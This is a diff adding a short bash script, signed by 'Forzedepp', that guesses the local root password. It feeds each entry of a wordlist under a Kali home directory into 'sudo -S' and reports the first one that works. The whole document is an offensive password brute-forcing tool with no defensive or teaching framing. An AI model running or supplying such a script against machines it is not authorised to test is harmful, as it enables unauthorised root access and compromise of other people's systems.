@@ -1,0 +1,23 @@
+#!/bin/bash
+
+# setting variables
+user="root"  # connecting to the root user
+file="/home/kali/Desktop/wordlist"  # Replace with the path to the file with a list of passwords
+
+# Brute force passwords
+while read -r pass; do
+    if echo "$pass" | sudo -S -u "$user" id >/dev/null 2>&1
+    then
+        echo "Password found: $pass"
+        exit 0
+    else
+        echo "Testing password '$pass'"
+    fi
+done < "$file"
+
+# If the password is not found
+echo "Password not found"
+exit 1
+
+
+#\ Created by Forzedepp \#
